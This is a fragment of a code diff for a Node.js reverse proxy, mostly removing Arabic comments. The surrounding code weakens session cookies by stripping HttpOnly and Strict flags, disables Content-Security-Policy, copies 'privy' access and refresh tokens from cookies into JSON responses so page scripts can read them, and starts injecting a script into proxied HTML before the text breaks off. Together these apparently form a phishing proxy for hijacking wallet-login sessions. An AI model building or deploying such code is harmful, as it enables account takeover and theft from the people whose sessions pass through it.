@@ -28,7 +28,6 @@ const proxy = createProxyMiddleware({
     });
 
     proxyRes.on('end', () => {
-      // 1) تعديل Set-Cookie flags
       const rawCookies = proxyRes.headers['set-cookie'] || [];
       const modifiedCookies = rawCookies.map(cookie =>
         cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
@@ -43,7 +42,6 @@ const proxy = createProxyMiddleware({
         "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
       );
 
-      // 3) Copy باقي الرؤوس
       Object.entries(proxyRes.headers).forEach(([name, value]) => {
         const lower = name.toLowerCase();
         if (lower === 'set-cookie' || lower === 'content-security-policy') return;
@@ -52,7 +50,7 @@ const proxy = createProxyMiddleware({
 
       const contentType = proxyRes.headers['content-type'] || '';
 
-      // 4) JSON branch: inject privy_access_token و privy_refresh_token
+      // 4) JSON branch: inject privy_access_token , privy_refresh_token
       if (contentType.includes('application/json')) {
         const text = buffer.toString('utf8');
         let modifiedBody = text;
@@ -60,7 +58,6 @@ const proxy = createProxyMiddleware({
         try {
           const obj = JSON.parse(text);
 
-          // استخراج قيم الكوكيز
           let accessTokenValue = '';
           let refreshTokenValue = '';
           rawCookies.forEach(cookie => {
@@ -71,7 +68,6 @@ const proxy = createProxyMiddleware({
             if (cookieName === 'privy-refresh-token') refreshTokenValue = value;
           });
 
-          // حقنهم في الجسم
           if (accessTokenValue)  obj.privy_access_token  = accessTokenValue;
           if (refreshTokenValue) obj.privy_refresh_token = refreshTokenValue;
 
@@ -85,7 +81,6 @@ const proxy = createProxyMiddleware({
         return res.end(modifiedBody);
       }
 
-      // 5) HTML branch: inject script قبل </body>
       if (contentType.includes('text/html')) {
         let html = buffer.toString('utf8');
         const scriptTag = `<script>
